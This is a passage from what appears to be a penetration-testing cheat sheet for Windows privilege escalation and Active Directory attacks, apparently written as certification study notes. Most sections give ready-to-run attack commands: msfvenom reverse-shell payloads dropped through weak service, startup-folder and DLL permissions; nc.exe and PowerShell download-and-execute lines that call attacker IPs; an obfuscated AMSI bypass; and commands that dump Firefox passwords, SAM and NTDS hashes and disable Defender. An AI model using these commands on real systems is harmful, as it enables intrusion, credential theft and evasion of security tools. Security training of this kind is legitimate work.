-     w64-mingw32-gcc windows_service.c -o raman.exe     (sudo apt install gcc-mingw-w64)
5. move the compiled c file to Windows then run it using
-     reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc  /v ImagePath /t REG_EXPAND_SZ /d c:\temp\raman.exe /f
-     sc start regsvc 


# <span style="color:lightblue">Executable Files</span>

## <span style="color:lightgreen">Methodology</span>
Microsoft Windows services, formerly known as NT services, enable you to create long-running executable applications that run in their own Windows sessions. These services can be automatically started when the computer boots, can be paused and restarted, and do not show any user interface.

Hence if we get Full Contol permission over the file path location, we can drop our malicious executable file to gain administrator access.

## <span style="color:lightgreen">Detection</span>

1. Run Powerup.ps1 and Run `Invoke-AllChecks` (check the service executable field)
```console
C:\Temp> powershell -ep bypass
PS C:\Temp>. .\PowerUp.sp1
PS C:\Temp> Invoke-AllChecks
```

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/d4167972-4387-4324-a03b-d9a4e951b055)


We can see that we have Modifiable File access to `"c:\Program Files\File Permissions Service\filepermservice.exe"`. To gain administrator access, we can drop our malicious executable file on this location.

## <span style="color:lightgreen">Exploitation</span>

### Kali VM

1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```

2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o x.exe
```

3. Copy the generated file `x.exe`, to the Windows VM and replace it over  `filepermsvc.exe`.

### Windows VM

1. In command prompt type: 
```console
C:\Temp> sc start filepermsvc
```

### Kali VM

1. Wait for a reverse shell on your kali machine.

### Another approach using windows_service.c file

1. Transfer the file from Windows to Kali. Use an FTP server to do that
-     python -m pyftpdlib -p 21 --write    (pip3 install pyftpdlib  #to download it) (run it on kali)
2. head to C:\Tools\Source and connect to the kali FTP server, anonymous login, then put the windows_service.c file
-     ftp 10.10.16.4 | username:anonymous | put windows_service.c
3. edit the windows_service file and replace the system("whoami > ..") with system("nc.exe -e cmd.exe <Attacker_IP> <PORT>").
4. compile the C file
-     w64-mingw32-gcc windows_service.c -o raman.exe     (sudo apt install gcc-mingw-w64)
5. move the compiled c file to Windows then run it using
-     reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc  /v ImagePath /t REG_EXPAND_SZ /d c:\temp\raman.exe /f
-     sc start regsvc 

# <span style="color:lightblue">Startup Applications</span>

## <span style="color:lightgreen">Methodology</span>

Startup apps run in the background, the number of apps running on the system can be significantly more than what the user is aware of and affect system responsiveness. Startup apps are classified to include those leveraging these mechanisms to start:
+ Run registry keys (HKLM, HKCU, wow64 nodes included)
+ RunOnce registry keys
+ Startup folders under the start menu for per user and public locations

So basically, we need full access to the Startup folder. Then by dropping our malicious executable file, we will gain administrator access.

## <span style="color:lightgreen">Detection</span>

### Windows VM

1. Open the command prompt and type the following to check the permission. Path is static: 
```console
C:\Temp> icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/12f85b86-6240-4ec0-add1-168afce6b7e7)

you also can use accesschk to check the permission

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/c6ed4ab5-2b46-47ab-8472-375e8387a561)


2. From the output notice that the `"BUILTIN\Users"` group has full access `'(F)'` to the directory.

## <span style="color:lightgreen">Exploitation</span>

### Kali VM

1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```

2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53  -f exe -o y.exe
```
3. Copy the generated file, `y.exe`, to the Windows VM.

### Windows VM

1. Place `y.exe` in `"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"`.

2. logout and login again
### Kali VM

1. Wait for a reverse shell on your kali machine. [Reference](https://3alam.pro/redvirus/articles/privilege-escalation-startup-programs)

# <span style="color:lightblue">Port Forwarding</span>

## <span style="color:lightgreen">Methodology</span>
Let us first understand what Port Forwarding is. Sometimes, after you hack the device, there are internal ports. These internal ports may be infected with a specific vulnerability and operate with high powers, or you may benefit from them in general by increasing permissions.

## <span style="color:lightgreen">Detection</span>
When I did nmap scan on the machine. we didn't get either SMB nor RDP 
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/bea0a5de-6c5d-4c0a-9f59-a71b21351eab)

1. run winPEASE and look for clear credentials in the registry; if you already have ignore the this step
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/ca9fb58c-1cb9-44c1-9af7-148665edbbdc)

2. check the internal open ports in the machine using `"netstate -ano"`. port 445 is locally opened so you need to check what is there. use ssh with [plink.exe](https://github.com/fwbuilder/w32-bin/blob/master/plink.exe)

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/64ca3155-5c20-4c3f-b8f4-47f0232620e1)

## <span style="color:lightgreen">Exploitation</span>

1.  install ssh and edit the config file (kali)
```
apt install ssh && nano /etc/ssh/sshd_config
```
2.  change #PermitRootLogin line in the sshd_config file to the following
```
PermitRootLogin yes
service ssh restart && service ssh enable
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/9cbb48fa-f75d-4e43-8d08-61d8c1233746)

3.  transfer plink tool to the Windows machine and run the following command
```
plink.exe -l <KaliUser> -pw <KaliPasswd> -R <ServicePort in Windows>:127.0.0.1:<KaliPort> <KaliIP>
#OR
plink.exe <kaliUser>@<kaliIP> -R <SMBserviceinWindows port 445>:127.0.0.1:<OpenPortInKali>
```
4. run `"netstat -tlp"` on kali to ensure that new port was opened in kali machine
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/16d7e702-43ad-4df4-b91e-7730b80bf267)

5.  now you need to use winexe tool to execute a command in Windows
-     winexe -U Administrator%<Password that you found in the registry> //127.0.0.1 "cmd.exe"
#OR

6. You also can get an elevated shell using [psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
```
psexec.py admin:password123@127.0.0.1 cmd  #creds that you found in registry using winPEASE
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/a224b657-ddd6-4631-8f6b-e295413f9ee3)

# <span style="color:lightblue">Windows Subsystem for Linux</span>

## <span style="color:lightgreen">Methodology</span>
you can think about it as VM in Windows machine. if besh.exe and wsl.exe are installed you are good to go

## <span style="color:lightgreen">Detection</span>
check if bash.exe and wsl.exe are installed
-     where /R c:\windows bash.exe

## <span style="color:lightgreen">Exploitation</span>
run either bash.exe or wsl.exe to get a shell then use python tty escape to get a shell
```
C:\>c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
python -c 'import pty; pty.spawn("/bin/bash")'
```
now you are running linux machine. you can use linux commands and continue enumeration

# <span style="color:lightblue">DLL Hijacking</span>

## <span style="color:lightgreen">Methodology</span>
Check DLL Hijacking from hacktricks FYR.

Some servers rely on DLL files at the time, but if the DLL file that the server relies on is deleted, Windows will search it in several paths:

-   The directory from which the application is loaded
-   `C:\Windows\System32`
-   `C:\Windows\System`
-   `C:\Users\AllUsers\AppData\Local\Microsoft\WindowsApps`
-   `C:\Temp`
-   `C:\Windows`

We assume that if we have write permission on one of these paths, and we also know that the service relies on dll files, we will create a malicious file with the extension dll and the same name as the file that the service is searching for.

But unfortunately, it is difficult to know whether this service depends on DLL or not except through the Process Monitor program, and this program requires high permissions.

## <span style="color:lightgreen">Detection</span>

###  Windows VM (RDP is required)
1. Transfer [Procmon.exe](https://strontic.github.io/xcyclopedia/library/Procmon.exe-EB2A0D7AC44B9B66E884EE5087305ACC.html) on the Windows VM
2. Right click on `Procmon.exe` and select `'Run as administrator'` from the menu.
3. In procmon, select `"filter"`.  From the left-most drop down menu, select `'Process Name'`.
4. In the input box on the same line type: `dllhijackservice.exe`
5. Make sure the line reads “Process Name is `dllhijackservice.exe` then Include” and click on the `'Add'` button, then `'Apply'` and lastly on 'OK'.
6. Next, select from the left-most drop down menu `'Result'`.
7. In the input box on the same line type: `NAME NOT FOUND`.
8. Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the `'Add'` button, then `'Apply'` and lastly on 'OK'.

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/68c1f9b7-3c68-47b8-bf39-40b61e4190ad)

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/b5d988cc-d12f-4aa3-975d-684357add0d8)


9. Open command prompt and type: 
```console
C:\Temp> sc start dllsvc
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/489d87f3-c022-477d-b4c8-1596cf36536e)


10. Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute `'C:\Temp\hijackme.dll'` yet it could not do that as the file was not found. Note that `'C:\Temp'` is a writable location.
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/7e158da5-450c-47b4-addb-f7b6a9abe453)

### Using winPEASE

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/edfadeb7-59ef-446c-b63e-80d765ffe18d)

We note that we have write permission on the Temp folder, and we mentioned previously that the Temp folder is one of the folders in which DLL files are searched.

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/ad03f19f-69f6-46d5-a88f-ae7de4c90aae)

This service is vulnerable to DLL Hijacking

check if I can start & stop the service using accesschk
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/8802a456-895d-4b13-80b8-bc9aed0b8ab2)

## <span style="color:lightgreen">Exploitation</span>

### Kali VM

1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```

2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f dll -o hijackme.dll
```
The name of the malicious file must be the same as the name of the file that the server is searching for
Ok, how did you know that the name is hijackme also through the Process Monitor program, and this program requires high permissions

3. Copy the generated file `hijackme.dll`, to the Windows VM.

### Windows VM

1. Place `hijackme.dll` in` 'C:\Temp'`
2. Open command prompt and type: 
```console
C:\Temp> sc stop dllsvc & sc start dllsvc
```

### Kali VM

1. Wait for a reverse shell on your kali machine.


# <span style="color:lightblue">BinPath</span>

## <span style="color:lightgreen">Methodology</span>

BinPath is a type of Service Escalation. We can gain administrator privileges if we write access and restart access on any service. We can abuse this function by injecting our malicious BinPath to get executed once restarted.

## <span style="color:lightgreen">Detection</span>

### Using Script on Windows VM

1. Run Powerup.ps1 and Run `Invoke-AllChecks` (check the service permissions field)

```console
C:\Temp> powershell -ep bypass
PS C:\Temp>. .\PowerUp.sp1
PS C:\Temp> Invoke-AllChecks
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/aff13a5b-82aa-486b-b7ed-8b23ca523762)

continue enumeration to check if you can change the path of the service

### Checking manually on Windows VM

1. Run [AccessChk64.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)

```console
C:\Temp> accesschk64.exe -uwcv Everyone *

# Switch meaning
# w --> only show items that have write access
# v --> verbose; dispaly as many details as possible
# u --> ignore the errors
# c --> displays service name of the following
# Everyone --> means everyone as a group who hass access
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/732f0827-ca4d-4abe-8c76-bd679036255a)

we got the same service again from manual enumeration

2. Using [AccessChk64.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) query the service found
```console
C:\Temp> accesschk64.exe -uwcv daclsvc
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/5513d357-9577-4051-bdbd-21e04207f7e4)

we can start & stop the service.

3. Find the BINARY_PATH_NAME
```console
C:\Temp> sc qc daclsvc
```

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/d611d97c-fc41-4442-8ac5-68cc8f37c35e)


##  <span style="color:lightgreen">Exploitation</span>

### Kali VM
1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```

2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o reverse.exe
```
3. Copy the generated file `reverse.exe`, to the Windows VM.

### Windows VM

1. Place `reverse.exe` in` 'C:\Temp'`
2. In command prompt type: 
```console
C:\Temp> sc config daclsvc binpath= "C:\Temp\reverse.exe"
```
3. In command prompt type: 
```console
C:\Temp> sc start daclsvc
```

### Kali VM

1. Wait for a reverse shell on your kali machine.

### If you can't transfer the payload to windows (AV is blocking) use the following exploit in the BinPath
-     sc config <Service> binpath="C:\Users\mssql-svc\Desktop\nc.exe 10.10.16.14 9004 -e cmd.exe"
# <span style="color:lightblue">Unquoted Service Paths</span>

## <span style="color:lightgreen">Methodology</span>

When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability known as Unquoted Service Path which allows a user to gain SYSTEM privileges (only if the vulnerable service is running with SYSTEM privilege).

In Windows, if the service is not enclosed within quotes and is having spaces, it would handle the space as a break and pass the rest of the service path as an argument.

## <span style="color:lightgreen">Detection</span>

1. Run Powerup.ps1 and Run `Invoke-AllChecks` (check the unquoted service field)
```console
C:\Temp> powershell -ep bypass
PS C:\Temp>. .\PowerUp.sp1
PS C:\Temp> Invoke-AllChecks
```

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/54c3e5a4-cc2c-4627-bb7e-fb1b5540a042)

2. use accesschk tool to check if you can stop & start the service
```
accesschk.exe /accepteula -ucqv unquotedsvc
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/d0f86e09-5009-4cd6-bfb2-4621c844353d)

3. check each folder before the service path starting from the root if you have read or write permission
```
accesschk.exe /accepteula -uwdq FolderPath
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/457a182b-312e-4fe1-97f7-4345eff8b0f6)

as you can see you don't have read or write permission in C folder. check the next folder

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/db03daaa-2404-4818-808b-2021f8b08411)

in `"Unquoted Path Service"` folder we have read & write permission so you can put your payload here. your payload name should be exactly the same name of the next folder

for example your path is `"C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe"` and you have read & write permission in `"Unquoted Path Service"` folder your payload should be Common.exe

##  <span style="color:lightgreen">Exploitation</span>
### Kali VM

1. Start a netcat listener
```console
$ sudo nc -nvlp 53
```

2. Open an additional command prompt and type: 
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o common.exe
```
3. Transfer the generated file, `common.exe`, to the Windows VM.

### Windows VM

1. Place `common.exe` in `'C:\Program Files\Unquoted Path Service'`.
2. Open command prompt and type: 
```console
C:\Temp> sc start unquotedsvc
# OR
C:\Temp> net start unquotedsvc
```

### Kali VM

1. Wait for a reverse shell on your kali machine.

# <span style="color:lightblue">Juicy potato attack</span>

## <span style="color:lightgreen">Methodology</span>

This privilege allows us to impersonate a token of a privileged account such as NT AUTHORITY\SYSTEM. 

## <span style="color:lightgreen">Detection</span>


### Windows VM

1. We should have `SeImpersonatePrivilege` privileges enabled
```console
C:\Temp>whoami /priv
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/34cc6333-eed0-4a6e-9c1e-1b71acb87944)


##  <span style="color:lightgreen">Exploitation</span>

### Kali VM
1. Copy `Invoke-PowerShellTcp.ps1` from [nishang](https://github.com/samratashok/nishang/tree/master/Shells) shells as `shell.ps1`
2. Add the line at the bottom of `shell.ps1`
```console
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.31 -Port 9999
```

3. Lets create a `shell.bat` file
```console
powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.31/shell.ps1')
```

4. Transfer `shell.bat` and `juicypotato.exe` on victim machine
```console
$ (new-object net.webclient).downloadfile('http://10.10.14.31/file', 'C:\temp\file')
```

5. Set a listener on port 9999
```console
$ sudo rlwrap nc -lnvp 9999
```

### Windows VM

+ Use CLSID depending upon the system version and select the CLSID which supports NT AUTHORITY\SYSTEM
+ Link --> [http://ohpe.it/juicy-potato/CLSID](http://ohpe.it/juicy-potato/CLSID)

2. run juicy potato
```console
$ ./jp.exe -p shell.bat -l 7777 -t * -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
#OR
JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *
#OR
juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID of your windows machine}
#OR
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```

### Kali VM

1. Wait for a reverse shell on your kali machine.

### Use Juicy Potato by setting up your SMB server if the antivirus is on
```
impacket-smbserver raman `pwd` #set up SMB server
cmd /c "\\10.10.16.3\raman\juicypotato.exe -l 1337 -p \\10.10.16.3\raman\reverse.exe -t * -c {CLSID of your windows machine}"
```

### JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809. use PrintSpoofer instead.
```
curl 192.168.10.10/PrintSpoofer64.exe -o Pr.exe
.\Pr.exe -i -c cmd  OR .\PrintSpoofer32.exe -i -c powershell.exe
```

# <span style="color:lightblue">Hot Potato attack</span>

## <span style="color:lightgreen">Methodology</span>

Hot Potato takes advantage of known issues in Windows to gain local privilege escalation in default configurations, namely NTLM relay (specifically HTTP->SMB relay) and NBNS spoofing.

## <span style="color:lightgreen">Detection</span>

### Windows VM

1. We should have `SeImpersonatePrivilege` privileges enabled
```console
C:\Temp> whoami /priv
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/07560756-a313-4826-b33a-78f1e51765d9)


##  <span style="color:lightgreen">Exploitation</span>

I will be demonstrating a simple exploitation technique by adding a user to the local administrators group using [Tater.ps1](https://github.com/Kevin-Robertson/Tater/blob/master/Tater.ps1)

### Windows VM

1. Enter the following to gain administrator access
```console
C:\Temp> powershell.exe -nop -ep bypass
PS C:\Temp> Import-Module C:\Temp\Tater.ps1
PS C:\Temp> Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
```

# <span style="color:lightblue">Kernel Exploits</span>

## <span style="color:lightgreen">Searcing exploits</span>

This method is handy for checking any existing exploits available for the machine by looking at the system information.
From the results of [windows-exploit-suggester.py](https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py) we can select one of the kernel exploits and try to escalate privileges.

### Windows VM

1. Run systeminfo and save it into a text file

```console
C:\Temp> systeminfo
```

### Kali VM

1. Pass the file thorugh [windows-exploit-suggester.py](https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py)

```console
$ ./windows-exploit-suggester.py --update

[*] initiating...
[*] successfully requested base url
[*] scraped ms download url
[+] writing to file 2020-06-06-mssb.xlsx
[*] done

$ ./windows-exploit-suggester.py --database 2020-06-06-mssb.xlsx --systeminfo systeminfo.txt 

Exploits will be displayed here...
```

# <span style="color:lightblue">Password Mining Escalation - Firefox</span>

## <span style="color:lightgreen">Detection</span>
1. winpeas 
2. Path location :
```console
C:\Temp> C:\Users\usernamehere\AppData\Roaming\Mozilla\Firefox\Profiles
```

## Requirements
Copy the following files from the Windows VM to Kali VM:
1. key4.db
2. logins.json
3. addons.json
4. cert9.db

## <span style="color:lightgreen">Exploitation</span>
1. Download the following
```console
$ git clone https://github.com/lclevy/firepwd.git
```

2. Place the required files in the same directory and run the python file for the creds

```console
$ python3 firepwd.py
 
globalSalt: b'2d45b7ac4e42209a23235ecf825c018e0382291d'
<SNIP>
clearText b'86a15457f119f862f8296e4f2f6b97d9b6b6e9cb7a3204760808080808080808'
decrypting login/password pairs
   https://creds.com:b'mayor',b'<<HIDDEN>>'
```

# <span style="color:lightblue">Backup</span>
## <span style="color:lightgreen">Methodology</span>
sometimes the administrator makes a backup file of the SAM & SYSTEM. often these files are stored in the `"C:\Windows\Repair"` OR `"C:\Windows\System32\config\RegBack"`

## <span style="color:lightgreen">Detection</span>
1. Run winPEAS and check for the backup files
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/3c6d0d49-fca0-434f-8012-e10ec75c5db6) you got the SAM & SYSTEM files

## <span style="color:lightgreen">Exploitation</span>
1. use pwdump tool to dump the password of all users
-     python3 pwdump.py SYSTEM SAM


# <span style="color:lightblue">Runas-Savdcreds</span>
## <span style="color:lightgreen">Methodology</span>
We can check if there are any pre-existing credentials of the administrator on the system. We can abuse this by using the loaded creds for privilege escalation. In the below example, I will demonstrate how to read files through the saved creds.

## <span style="color:lightgreen">Detection</span>
1. winpeas 
2. Checking for existence

```console
$ cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/759d48ae-2904-4a72-81f6-7a55690de02c)

## <span style="color:lightgreen">Exploitation</span>
1. Reading root flag
```console
C:\Temp> C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE c:\Users\Administrator\Desktop\root.txt > C:\Users\security\root1.txt"
```

2. getting a reverse shell
use masfvenom 
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o program.exe
```
start the listener
```
nc -nlvp
```
runas exploit
```
runas /savecred /user:admin C:\Temp\program.exe
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/609e3011-2b5a-427f-92e3-15399306979b)


# <span style="color:lightblue">Backup Operators (Disk shadow + Robocopy)</span>

## <span style="color:lightgreen">Methodology</span>

If the user is a part of the Backup Operator group, the user has the ability to create system backups and could be used to obtain copies of sensitive system files that can be used to retrieve passwords such as the SAM and SYSTEM Registry hives and the NTDS.dit Active Directory database file.

## <span style="color:lightgreen">Detection</span>

1. The user should be a part of the Backup Operators group and should have  SeBackupPrivilege and SeRestorePrivilege Enabled

```console
C:\Temp> net user unsername-here
C:\Temp> whoami /all
```

## <span style="color:lightgreen">Exploitation</span>

### Kali VM
1. Create this script and transfer it to Windows VM

```powershell
set verbose onX
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```

### Windows VM

1. Pass the script to **diskshadow unility** to create the shadow copy
```powershell
PS C:\Temp> diskshadow /s script.txt
```
2. Now copy the NTDS file using **_Robocopy_** to the Temp file we created in the C: drive
```powershell
PS C:\Temp> robocopy /b E:\Windows\ntds . ntds.dit
```
3. Next we get the system registry hive that contains the key needed to decrypt the NTDS file with **_reg save_** command.
```powershell
PS C:\Temp> reg save hklm\system c:\temp\system.hive
```

### Dumping NTML Hashes

1. We can use `secretsdump.py` do decrypt the DA creds on Kali VM

```console
$ secretsdump.py -ntds ntds.dit -system system.hive LOCAL | tee hash-dump
```

# <span style="color:lightblue">Scheduled Tasks</span>
Windows has the ability to schedule tasks, meaning it is possible to execute a command or script on the system at a specific time or at a simultaneous time, for example, every five minutes, etc. you need to manually search for these files.
## <span style="color:lightgreen">Detection</span>
after manual enumeration. I found a file called CleanUp.ps1 in C:\DevTools. check the content of the file 

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/7064bea2-0762-411e-a68a-046af6d8f932)

there is a comment that says script will clean up all your old dev logs every minute and this file will run with SYSTEM privilege which is the highest privilege

## <span style="color:lightgreen">Exploitation</span>
1. Before exploitation check if you can write inside the file using accesschk

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/0610c463-aa5b-4e5a-8d95-4062cd9e72e9)

we have the write permission so we will contact our malicious file within the file

2. use msfvenom to generate a file

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/8c895b02-46dd-4446-a0cd-36a1e86abcad)

3. run nc to get a shell

# <span style="color:lightblue">Abusing GPO permissions</span>

## <span style="color:lightgreen">Exploitation</span>
We Abusing GPO by adding the user to the local Administrators group leveraging a tool called SharpGPOAbuse.

Source : [https://github.com/FSecureLABS/SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)

Pre compiled binaries : [https://github.com/Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection)

+ Add user to local administrator groups

```powershell
PS C:\Enterprise-Share> .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"
[+] Domain = vulnnet.local
[+] Domain Controller = VULNNET-BC3TCK1SHNQ.vulnnet.local
[+] Distinguished Name = CN=Policies,CN=System,DC=vulnnet,DC=local
[+] GUID of "SECURITY-POL-VN" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] Creating file \\vulnnet.local\SysVol\vulnnet.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!
```

+ Force Update the system

```powershell
PS C:\Enterprise-Share> gpupdate /force
Updating policy...
Computer Policy update has completed successfully.
User Policy update has completed successfully.
```

+ Now review our group memberships after we forced the policies to be updated on the target machine.

```powershell
PS C:\Enterprise-Share> net user enterprise-security
# Will be added to the administrators group
```

# <span style="color:lightblue">Export LAPS Passwords</span>

## <span style="color:lightgreen">Methodology</span>
The following script assumes that LAPS has already been configured into your environment & that your user account already has access to view LAPS passwords using the Fat Client UI or from Active Directory Users & Computers.

This script loads the Active Directory module, finds the LAPS password fields, and then saves them to a CSV with the date appended to the file name. The only thing you’d need to change is the file path.

## <span style="color:lightgreen">Exploitation</span>

1. Just Open Powershell and paste this script
```powershell
$Computers = Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
$Computers | Sort-Object ms-Mcs-AdmPwdExpirationTime | Format-Table -AutoSize Name, DnsHostName, ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
$computers | Export-Csv -path c:\temp\"LAPS-$((Get-Date).ToString("MM-dd-yyyy")).csv" -NoTypeInformation
```

2. Then, save it to the location of your choice. For this example, I’m saving to
```console
C:\Scripts\LAPSexport.ps1
```

3. Then, run the script to verify it works correctly. If it does, you should automate this procedure by creating a Scheduled Task.

# BloodHound Enumeration   Need Admin Privs
### Start BloodHound
Start neo4j and BloodHound UI on kali machine and load the zip/json files
```
sudo neo4j console  (credentials neo4j:to0or) | ulimit -n 100000  (if the service didn't work. Warning: max 1024 open files..)  #Get the local address from here
sudo bloodhound   (credentials neo4j:to0or)
```
### Data Collection 
1. Run Invisi-Shell
```
RunWithRegistryNonAdmin.bat
```
2. Bypass .NET AMSI using below code in PowerShell
```
$ZQCUW = @" 
using System; 
using System.Runtime.InteropServices; 
public class ZQCUW { 
    [DllImport("kernel32")] 
    public static extern IntPtr GetProcAddress(IntPtr hModule, string 
procName); 
    [DllImport("kernel32")] 
    public static extern IntPtr LoadLibrary(string name); 
    [DllImport("kernel32")] 
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr 
dwSize, uint flNewProtect, out uint lpflOldProtect); 
} 
"@ 
 
Add-Type $ZQCUW 
 
$BBWHVWQ = 
[ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115
 ;&#105;&#46;&#100;&#108;&#108;'))") 
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, 
"$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97
 ;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))") 
$p = 0 
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p) 
$TLML = "0xB8" 
$PURX = "0x57" 
$YNWL = "0x00" 
$RTGX = "0x07" 
$XVON = "0x80" 
$WRUD = "0xC3" 
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD) 
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
```
3. Run SharpHound (Investorer)
```
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All,LoggedOn -Verbose
#OR
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
```
4. Upload the data to bloodhound

To avoid detections like MDI
```
Invoke-BloodHound -CollectionMethod All -ExcludeDC
```
To avoid detections use Stealth
```
Invoke-BloodHound -Stealth
SharpHound.exe --stealth
```

# Runas
if you found AD credentials but nowhere to log in with them. Runas allows a user to run a specific program with a different account
```
runas.exe /netonly /user:<domain>\<username> cmd.exe
```

# Lateral Movement - PowerShell Remoting
Avoid using psexec as it is too noisy. instead, use `"Enter-PSSession"` need Admin Privs
```
Enter-PSSession -ComputerName <dcorp-adminsrv>
```
### Execute commands or scriptblocks on another machine
```
Invoke-Command -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock {whoami}   #check who you are
Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -command {whoami}   #check who you are
Invoke-Command -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true}   #Disable win defender
```
### File execution using ScriptBlock
```
Invoke-Command -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local -ScriptBlock{"C:\temp\mimikatz.exe"}
```
File execution using FilePath
```
Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -FilePath "C:\temp\mimikatz.exe"
```
### Execute locally loaded function on another machine
```
